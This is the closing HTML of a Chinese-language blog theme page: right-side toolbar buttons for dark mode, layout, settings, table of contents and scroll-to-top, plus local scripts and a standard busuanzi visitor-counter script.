type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
